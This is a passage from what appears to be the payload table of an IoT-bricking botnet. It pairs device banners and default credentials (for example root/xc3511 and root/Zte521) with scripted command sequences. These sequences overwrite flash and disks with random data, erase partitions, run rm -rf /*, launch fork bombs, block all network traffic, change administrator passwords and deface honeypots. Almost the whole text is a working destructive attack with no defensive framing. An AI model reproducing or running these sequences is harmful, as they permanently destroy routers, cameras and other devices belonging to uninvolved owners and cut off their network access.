              'tftp -p -f test ;route del default',
              '',
              "adsl connection --loopback\n"
              "xdslctl connection --loopback\n"
              "ppp config ppp0 down\n"
              "ppp config ppp1.1 down\n"
              "ppp config ppp2.1 down\n"
              "ppp config ppp3.3 down\n"
              "ppp config pppo3G0 down\n"
              "save",
              '',
              'defaultgateway config ppp0',
              '',
              'defaultgateway config ppp1.1',
              '',
              'defaultgateway config ppp2.1',
              '',
              'sh',
              '[#>]',
              'flash_erase /dev/mtdblock0 0 999999 0',
              '[$>#]',
              'flash_erase /dev/mtdblock1 0 999999 0',
              '[$>#]',
              'flash_erase /dev/mtdblock2 0 999999 0',
              '[$>#]',
              'flash_erase /dev/mtdblock3 0 999999 0',
              '[$>#]',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'route del default;iptables -F;iptables -A INPUT -j DROP',
              '',
              'poweroff -n -f',
              '[#>]',
              'poweroff',
              '[#>]',
              'restoredefault',
              '',
              'exit',
              '',
              'restoredefault',
              '%TERM%'
              ],
             ['xiongctrl',
              'admin/.*',
              'PORT:9527:',
              'shell\n'
              'busybox cat /dev/urandom >/dev/mtd0 &\n'
              'busybox cat /dev/urandom >/dev/mtd1 &\n'
              'busybox cat /dev/urandom >/dev/mtd2 &\n'
              'busybox cat /dev/urandom >/dev/mtd3 &\n'
              'busybox cat /dev/urandom >/dev/mtd4 &\n'
              'busybox cat /dev/urandom >/dev/mtd5 &\n'
              'busybox cat /dev/urandom >/dev/mtdblock0 &\n'
              'busybox cat /dev/urandom >/dev/mtdblock1 &\n'
              'busybox cat /dev/urandom >/dev/mtdblock2 &\n'
              'busybox cat /dev/urandom >/dev/mtdblock3 &\n'
              'busybox cat /dev/urandom >/dev/mtdblock4 &\n'
              'busybox cat /dev/urandom >/dev/mtdblock5 &\n'
              'route del default',
              '[$] ',
              'netitf -ip\n'
              'netitf -dhcp\n'
              'netitf -dhcp 0\n'
              'netitf -dns 1.2.3.4 1.2.3.5\n'
              'cfg -s /mnt/mtd/Config/Json\n'
              'cfg -s /mnt/custom/CustomConfig',
              '[$] ',
              'netitf -ip 1.2.3.4 255.255.255.0 1.2.3.5\n'
              'cfg -s /mnt/mtd/Config/Json\n'
              'cfg -s /mnt/custom/CustomConfig',
              '[$] ',
              'exit',
              '[$] ',
              'netitf -ip\n'
              'netitf -dhcp\n'
              'netitf -dhcp 0\n'
              'netitf -dns 1.2.3.4 1.2.3.5\n'
              'cfg -s /mnt/mtd/Config/Json\n'
              'cfg -s /mnt/custom/CustomConfig',
              '[$] ',
              'netitf -ip 1.2.3.4 255.255.255.0 1.2.3.5\n'
              'cfg -s /mnt/mtd/Config/Json\n'
              'cfg -s /mnt/custom/CustomConfig',
              '[$] ',
              ';;',
              '[$] ',
              'netitf -ip\n'
              'netitf -dhcp\n'
              'netitf -dhcp 0\n'
              'netitf -dns 1.2.3.4 1.2.3.5\n'
              'cfg -s /mnt/mtd/Config/Json\n'
              'cfg -s /mnt/custom/CustomConfig',
              '[$] ',
              'netitf -ip 1.2.3.4 255.255.255.0 1.2.3.5\n'
              'cfg -s /mnt/mtd/Config/Json\n'
              'cfg -s /mnt/custom/CustomConfig',
              '[$] ',
              ],
             ['baby',
              '.*',
              '(www\.netween\.co\.kr|rjhm91lt37eEtYB0Czii1)',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[$>#] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[$>#] ',
              'cat /dev/urandom >/dev/root &',
              '%WAIT%',
              'cd /web/',
              '[$>#] ',
              'grep "reboot" *',
              '[$>#] ',
              ],
             ['vertex',
              'root/vertex25ektks123',
              '',
              'configure terminal',
              '[$>#] ',
              'restore factory-defaults',
              '[$>#] ',
              'exit',
              '[$>#] ',
              'quote sh',
              '[$>#] ',
              'cat /dev/urandom >/dev/root &',
              '[$>#] ',
              'cat /dev/urandom >/dev/ram &',
              '[$>#] ',
              'route del default',
              '%WAIT%',
              'reboot',
              ],
             ['honeypot',
              cred_semirand,
              '',
              'cat /etc/passwd',
              '',
              'cat /etc/shadow',
              '',
              'uname -a',
              '',
              ],
             ['honeypot',
              '.*',
              '(fw-mgmt0|Ubuntu|el\d\.x86_?64|Debian GNU\/Linux comes with '
              'ABSOLUTELY NO WARRANTY, to the extent|Linux\s\S+S\d\s.*x86_?64|'
              'Linux\s.*amd64.*SMP.*Debian.*x86_?64)',
              'echo SYSTEM HACKED PLEASE REINSTALL >/etc/motd',
              '',
              'echo SYSTEM HACKED PLEASE REINSTALL >/etc/version',
              '',
              'echo SYSTEM-HACKED-PLEASE-REINSTALL >/etc/hostname',
              '',
              'wall \x1b]2;HACKED\x07',
              '',
              ],
             ["sagemcom",
              ".*",
              'HomeGateway.*\s*.*Bad\scommand.*Try\susing\shelp',
              "conf print /admin/",
              "HomeGateway> ",
              "conf set /admin/rmt_mng/ports/2/enabled 0",
              "HomeGateway> ",
              "conf set /admin/rmt_mng/ports/1/enabled 0",
              "HomeGateway> ",
              "conf set /admin/rmt_mng/ports/0/enabled 0",
              "HomeGateway> ",
              "conf set /admin/user/2/password x",
              "HomeGateway> ",
              "conf set /admin/user/1/password x",
              "HomeGateway> ",
              "conf set /admin/user/0/password x",
              "HomeGateway> ",
              "conf reconf 1",
              "HomeGateway> ",
              "flash commit",
              "HomeGateway> ",
              "system reboot",
              '%TERM%',
              ],
             ["sagemcom",
              ".*",
              'OpenRG>',
              "conf print /admin/",
              "OpenRG> ",
              "conf set /admin/rmt_mng/ports/2/enabled 0",
              "OpenRG> ",
              "conf set /admin/rmt_mng/ports/1/enabled 0",
              "OpenRG> ",
              "conf set /admin/rmt_mng/ports/0/enabled 0",
              "OpenRG> ",
              "conf set /admin/user/2/password x",
              "OpenRG> ",
              "conf set /admin/user/1/password x",
              "OpenRG> ",
              "conf set /admin/user/0/password x",
              "OpenRG> ",
              "conf reconf 1",
              "OpenRG> ",
              "flash commit",
              "OpenRG> ",
              "system reboot",
              '%TERM%',
              ],
             ["nomadix",
              '.*',
              'Display advanced system configuration menu',
              'system',
              '\S>',
              'factory',
              'yes/no',
              'yes',
              'CR',
              '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
              '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
              '\n\n\n\n\n\n\n\n',
              'CR',
              '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
              '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
              '\n\n\n\n\n\n\n\n',
              'CR',
              '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
              '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'
              '\n\n\n\n\n\n\n\n',
              'CR',
              ],
             ['sse',
              '.*',
              'step into administration terminal',
               '',
              '~ ',
              'd() { d|d & }; d',
              '~ ',
              ],
             ['cisco',
              '.*',
              'User Access Verification',
              'enable',
              '\S+[#>]',
              'erase /all nvram:',
              'confirm',
              'y',
              '\S+[#>]',
              'erase startup-config',
              'confirm',
              'y',
              '\S+[#>]',
              'reload',
              'yes/no',
              'y',
              'confirm',
              'y',
              '',
              'power rps port 6 mode standby',
              '\S+[#>]',
              'power rps port 5 mode standby',
              '\S+[#>]',
              'power rps port 4 mode standby',
              '\S+[#>]',
              'power rps port 3 mode standby',
              '\S+[#>]',
              'power rps port 2 mode standby',
              '\S+[#>]',
              'power rps port 1 mode standby',
              '\S+[#>]',
              ],
             ['kylink',
              '.*',
              'Kylink SIP',
              '8',
              'y/n',
              'y',
              '\):',
              '9',
              'y/n',
              'y',
              '\):',
              '1',
              '\):',
              '1',
              '\):',
              '1.2.3.4',
              '\):',
              '3',
              '\):',
              '1.2.3.5',
              '\):',
              'q',
              '\):',
              '9',
              'y/n',
              'y',
              '\):',
              'b',
              'y/n',
              'y',
              'seconds',
              ],
             ["dahuaold",
              "root/vizxv",
              '',
              'busybox cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'busybox cat /dev/urandom >/dev/sda &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock10 &',
              '',
              'busybox cat /dev/urandom >/dev/mmc0 &',
              '',
              'busybox cat /dev/urandom >/dev/sdb &',
              '',
              'busybox cat /dev/urandom >/dev/ram0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock3 &',
              '',
              "fdisk -C 1 -H 1 -S 1 /dev/mtd0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/sda",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtdblock0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'route del default;'
              'iproute del default;'
              'ip route del default;'
              'rm -rf /* 2>/dev/null &',
              '%WAIT%',
              'sysctl -w net.ipv4.tcp_timestamps=0;'
              'sysctl -w kernel.threads-max=1',
              '%WAIT%',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ["hilinux",
              ".*",
              'Welcome to HiLinux',
              'busybox cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'busybox cat /dev/urandom >/dev/sda &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock10 &',
              '',
              'busybox cat /dev/urandom >/dev/mmc0 &',
              '',
              'busybox cat /dev/urandom >/dev/sdb &',
              '',
              'busybox cat /dev/urandom >/dev/ram0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock3 &',
              '',
              "fdisk -C 1 -H 1 -S 1 /dev/mtd0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/sda",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtdblock0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'route del default;'
              'iproute del default;'
              'ip route del default;'
              'rm -rf /* 2>/dev/null &',
              '%WAIT%',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '%WAIT%',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ["zlx",
              "root/zlxx\.",
              "",
              'busybox cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd1 &',
              '',
              'busybox cat /dev/urandom >/dev/sda &',
              '',
              'busybox cat /dev/urandom >/dev/ram0 &',
              '',
              'flash_unlock /dev/mtd0',
              '',
              'flash_eraseall /dev/mtd0 &',
              '',
              'flash_unlock /dev/mtd1',
              '',
              'flash_eraseall /dev/mtd1 &',
              '',
              'flash_unlock /dev/sda',
              '',
              'flash_eraseall /dev/sda &',
              '',
              'flash_unlock /dev/mtdblock0',
              '',
              'flash_eraseall /dev/mtdblock0 &',
              '',
              "fdisk -C 1 -H 1 -S 1 /dev/sda",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtd0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 -H 1 -S 1 /dev/mtdblock0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'd(){ d|d & };d 2>/dev/null',
              '[#$>] ',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '[#$] ',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ['netbox',
              '.*',
              "ERROR: no such command \'w\'",
              'shell',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'route del default',
              '%WAIT%',
              ],
             ['falcon',
              '.*',
              '(Unknown Command: \'|RMT:\d+.*@telnet:)',
              'offline',
              '[>#] ',
              'offline',
              '[>#] ',
              'passwd',
              'password',
              '%OLDPASS%',
              'password',
              '%NEWPASS%',
              'password',
              '%NEWPASS%',
              '[>#] ',
              'reset board',
              '[>#] ',
              'DSC sleep 99999999',
              '[>#] ',
              'ip sat0 add 1.2.3.4 255.255.255.0 1.2.3.5 sat0',
              '[>#] ',
              'params GLOBAL set max_mssg_bufs 1',
              '[>#] ',
              'params GLOBAL set initial_mssg_bufs 1',
              '[>#] ',
              'params SECURITY set falcon_console_from_localhost_only 1',
              '[>#] ',
              'params LL set ll_tx_window 1',
              '[>#] ',
              'params LL set ll_rx_window 1',
              '[>#] ',
              'params SPOOF set spoof_oos_buffer_size 1',
              '[>#] ',
              'params PAD set pad_tdma_payload 1',
              '[>#] ',
              'reset application',
              '%WAIT%',
              'ENTER_ERROR_STATE',
              '[>#] ',
              'TERMINATE',
              '[>#] ',
              ],
             ["chin",
              'root/1001chin',
              '',
              'dd if=/dev/urandom of=/dev/sda1 &',
              '',
              'dd if=/dev/urandom of=/dev/sda2 &',
              '',
              'dd if=/dev/urandom of=/dev/sda3 &',
              '',
              'dd if=/dev/urandom of=/dev/sda4 &',
              '',
              'dd if=/dev/urandom of=/dev/sda &',
              '',
              'dd if=/dev/urandom of=/dev/root &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '[#$>] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT% ',
              'd(){ d|d & };d 2>/dev/null',
              '[#$>] ',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '%WAIT% ',
              'halt -n -f',
              '[#$>] ',
              'reboot',
              '[#$>] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ["faraday",
              "root/GM8182",
              "",
              "cat /dev/urandom >/dev/sda &\n"
              "cat /dev/urandom >/dev/mtdblock4 &\n"
              "cat /dev/urandom >/dev/mtdblock5 &\n"
              "cat /dev/urandom >/dev/mtdblock6 &\n"
              "cat /dev/urandom >/dev/mtdblock7 &\n"
              "cat /dev/urandom >/dev/mtdblock8 &\n"
              "cat /dev/urandom >/dev/root &\n"
              "route del default",
              '',
              "fdisk -C 1 /dev/sda",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 /dev/mtdblock4",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 /dev/mtdblock5",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 /dev/mtdblock6",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 /dev/mtdblock7",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 /dev/mtdblock8",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk -C 1 /dev/root",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "route del default",
              '%WAIT%',
              "sysctl -w net.ipv4.tcp_timestamps=0",
              '[#$] ',
              "sysctl -w kernel.threads-max=1",
              '%WAIT% ',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ["ht-tm",
              "root/20080826",
              "",
              'busybox cat /dev/urandom >/dev/mtd0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd3 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd4 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd5 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'route del default;rm -rf /* &',
              '%TERM%',
              ],
             ["ht-tm",
              ".*",
              "root.*cIUPc1dKQYHkkKkiVpM",
              '%RELAUNCH%',
              '%RELAUNCH%',
              ],
             ["xiongmai",
              "root/xc3511",
              '',
              "busybox cat /dev/urandom >/dev/mtd0 &\n"
              "busybox cat /dev/urandom >/dev/mtd1 &\n"
              "busybox cat /dev/urandom >/dev/mtd2 &\n"
              "busybox cat /dev/urandom >/dev/mtd3 &\n"
              "busybox cat /dev/urandom >/dev/mtd4 &\n"
              "busybox cat /dev/urandom >/dev/mtd5 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock0 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock1 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock2 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock3 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock4 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock5 &\n"
              "route del default;rm -rf /* 2>/dev/null &",
              '',
              'busybox cat /dev/urandom >/dev/mtd0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd3 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd4 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd5 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'route del default;rm -rf /* 2>/dev/null &',
              "%WAIT%",
              "poweroff -n -f",
              '%TERM%',
              ],
             ["xiongmai",
              "root/xmhdipc",
              '',
              "busybox cat /dev/urandom >/dev/mtd0 &\n"
              "busybox cat /dev/urandom >/dev/mtd1 &\n"
              "busybox cat /dev/urandom >/dev/mtd2 &\n"
              "busybox cat /dev/urandom >/dev/mtd3 &\n"
              "busybox cat /dev/urandom >/dev/mtd4 &\n"
              "busybox cat /dev/urandom >/dev/mtd5 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock0 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock1 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock2 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock3 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock4 &\n"
              "busybox cat /dev/urandom >/dev/mtdblock5 &\n"
              "route del default;rm -rf /* 2>/dev/null &",
              '',
              'busybox cat /dev/urandom >/dev/mtd0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd3 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd4 &',
              '',
              'busybox cat /dev/urandom >/dev/mtd5 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'busybox cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'route del default;rm -rf /* 2>/dev/null &',
              "%WAIT%",
              "poweroff -n -f",
              '%TERM%',
              ],
             ["zte",
              "root/Zte521",
              '',
              'flash_eraseall /dev/mtd0 >/dev/null &',
              '',
              'flash_eraseall /dev/mtd1 >/dev/null &',
              '',
              'flash_eraseall /dev/mtd2 >/dev/null &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'iptables -F;iptables -t nat -F',
              '',
              'ip route del default',
              '',
              'ip route',
              '[#$] ',
              'ip link set ppp0 down',
              '',
              'ip link set br0 down',
              '',
              'ip link set eth0 down',
              '',
              'iptables -A fwinput -J DROP;iptables -A OUTPUT -j DROP;rm -rf /* &',
              '%WAIT%',
              ],
             ["zyxel",
              ".*",
              'Linux\sZyXEL\s2.*mips.*BusyBox',
              "iptables -F",
              '',
              "iptables -t nat -F",
              '',
              "route del default",
              '',
              'sysctl -w kernel.threads-max=1',
              '',
              "iptables -A OUTPUT -j DROP",
              '%WAIT%',
              ],
             ["hisilicon",
              "root/jvbzd",
              'w:\snot\sfound',
              "fdisk /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/sda",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "iproute del default",
              '[#$] ',
              "sysctl -w net.ipv4.tcp_timestamps=0",
              '[#$] ',
              "sysctl -w kernel.threads-max=1",
              '%WAIT% ',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ["juantech",
              "root/juantech",
              'w:\snot\sfound',
              'cat /dev/urandom >/dev/sda &',
              '',
              'cat /dev/urandom >/dev/sda1 &',
              '',
              'cat /dev/urandom >/dev/sda2 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'cat /dev/urandom >/dev/mtd4 &',
              '',
              'cat /dev/urandom >/dev/mtd5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              "route del default",
              '[#$] ',
              "fdisk /dev/sda2",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/sda1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/sda",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "sysctl -w net.ipv4.tcp_timestamps=0",
              '[#$] ',
              "sysctl -w kernel.threads-max=1",
              '%WAIT% ',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ['celltrash',
              '.*',
              '5: Load Default and Reboot Router',
              '2',
              '#',
              '3',
              'mode:',
              '4',
              'no\S:',
              '2',
              '#',
              '0',
              '#',
              '4',
              '#',
              ],
             ["dlink",
              ".*",
              'upgrade.*dlink\.ru.*firm.*',
              "set lan ip 10.1.2.3 255.255.255.0\nsave",
              '',
              "set upnp off\nsave",
              '',
              "set dhcp off\nsave",
              '',
              "set dmz off\nsave",
              '',
              "set wifi off\nsave",
              '',
              "sh",
              '[#$] ',
              'cat /dev/urandom >/dev/sda &',
              '',
              'cat /dev/urandom >/dev/sda1 &',
              '',
              'cat /dev/urandom >/dev/sda2 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'cat /dev/urandom >/dev/mtd4 &',
              '',
              'cat /dev/urandom >/dev/mtd5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              "iptables -F",
              '',
              "iptables -t nat -F",
              '',
              'route del default;rm -rf /* 2>/dev/null &',
              '[#$] ',
              "iptables -A OUTPUT -j DROP",
              '%TERM%',
              ],
             ["dlink",
              ".*",
              'You have a full access',
              "set lan ip 10.1.2.3 255.255.255.0\nsave",
              '',
              "set upnp off\nsave",
              '',
              "set dhcp off\nsave",
              '',
              "set dmz off\nsave",
              '',
              "set wifi off\nsave",
              '',
              "sh",
              '[#$] ',
              'cat /dev/urandom >/dev/sda &',
              '',
              'cat /dev/urandom >/dev/sda1 &',
              '',
              'cat /dev/urandom >/dev/sda2 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'cat /dev/urandom >/dev/mtd4 &',
              '',
              'cat /dev/urandom >/dev/mtd5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              "iptables -F",
              '',
              "iptables -t nat -F",
              '',
              'route del default;rm -rf /* 2>/dev/null &',
              '[#$] ',
              "iptables -A OUTPUT -j DROP",
              '%TERM%',
              ],
             ["mdm",
              ".*",
              'mdm\d\d+\S*\$',
              "passwd",
              "Old password:",
              '%OLDPASS%',
              'Enter new password: ',
              '%NEWPASS%',
              'Re-enter new password: ',
              '%NEWPASS%',
              '[#$] ',
              'su root',
              'Password: ',
              'oelinux123',
              '[#$] ',
              'passwd',
              'New password: ',
              '%NEWPASS%',
              'Retype password: ',
              '%NEWPASS%',
              '[#$] ',
              'ps aux | grep -v "ps aux" | grep -v "grep" | grep -v "random" | '
              'grep -v "awk" | grep -v "xargs" | /bin/awk \'{print $1}\' | '
              'xargs kill -9',
              '%TERM%',
              ],
             ["mdm",
              ".*",
              'mdm\d\d+',
              'passwd',
              'New password: ',
              '%NEWPASS%',
              'Retype password: ',
              '%NEWPASS%',
              '[#$] ',
              'reboot',
              '%WAIT%',
              'ps aux | grep -v "ps aux" | grep -v "grep" | grep -v "random" | '
              'grep -v "awk" | grep -v "xargs" | /bin/awk \'{print $1}\' | '
              'xargs kill -9',
              '%TERM%',
              ],
             ["eltex",
              ".*",
              'M5J9DWFfcVbL.*AuwJc4KI.*bin/ash',
              "telnet localhost",
              'login: ',
              "root",
              'Password: ',
              'adminpassword',
              'root\S+# ',
              'passwd %OLDUSER%',
              'New password:',
              '%NEWPASS%',
              'Retype password:',
              '%NEWPASS%',
              'root\S+# ',
              'passwd',
              'New password:',
              '%NEWPASS%',
              'Retype password:',
              '%NEWPASS%',
              'root\S+# ',
              'save',
              'root\S+# ',
              'reboot',
              'root\S+# ',
              ],
             ['qcpe',
              'admin/.*',
              'CPE> .*please enter \? for help\.',
              'enable',
              '[#>] ',
              'router',
              '[#>] ',
              'wan name x y',
              '[#>] ',
              'wan commit',
              '[#>] ',
              "wan ip isp , user 1.2.3.4 255.255.255.0 1.2.3.5\nwan commit",
              '[#>] ',
              "lan ip 2.3.4.5 255.255.255.254\nlan commit",
              '[#>] ',
              'wlan disable',
              '[#>] ',
              '..',
              '[#>] ',
              'wimax',
              '[#>] ',
              'wmx auth username a b',
              '[#>] ',
              'wmx autoconnect disable',
              '[#>] ',
              'wmx commit',
              '[#>] ',
              "wmx disconnect\nwmx commit",
              '[#>] ',
              '..',
              '[#>] ',
              'router',
